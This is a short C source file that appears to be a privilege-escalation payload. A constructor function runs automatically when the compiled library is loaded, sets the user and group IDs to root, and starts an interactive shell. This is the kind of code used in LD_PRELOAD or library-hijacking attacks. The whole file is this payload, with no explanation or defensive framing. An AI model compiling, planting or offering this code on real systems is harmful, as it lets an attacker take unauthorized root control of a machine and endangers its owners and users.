#include <stdlib.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void){
    setuid(0);
    setgid(0);
    system("/bin/sh -i");
}
